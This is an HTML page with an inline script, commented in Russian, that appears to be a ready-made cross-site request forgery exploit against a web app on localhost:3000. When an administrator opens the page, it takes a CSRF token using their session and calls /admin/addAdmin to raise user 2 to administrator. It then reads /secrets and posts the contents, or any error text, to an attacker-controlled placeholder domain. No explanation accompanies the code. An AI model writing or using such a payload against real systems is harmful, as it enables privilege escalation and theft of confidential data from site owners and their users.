<!DOCTYPE html>
<html>
<body>
<script>
(async () => {
    try {
        // получаем CSRF-токен (отправляем запрос от лица администратора)
        const csrf = await fetch('http://localhost:3000/csrf-token', {
            credentials: 'include'
        }).then(r => r.json()).then(j => j.csrfToken);

        // повышаем себя до администратора
        await fetch('http://localhost:3000/admin/addAdmin', {
            method: 'POST',
            headers: {
                'Content-Type': 'application/json',
                'CSRF-Token': csrf
            },
            credentials: 'include',
            body: JSON.stringify({ userId: 2 }) // 2 – ваш ID в базе
        });

        // читаем страницу с секретами администратора
        const secret = await fetch('http://localhost:3000/secrets', {
            credentials: 'include'
        }).then(r => r.text());

        // отправляем результат обратно на наш сервер
        await fetch('https://ваш-домен.example/collect', {
            method: 'POST',
            headers: {'Content-Type': 'text/plain'},
            body: secret
        });
    } catch(e) {
        // в случае ошибки – просто отправляем текст ошибки
        await fetch('https://ваш-домен.example/error', {
            method: 'POST',
            body: e.toString()
        });
    }
})();
</script>
</body>
</html>
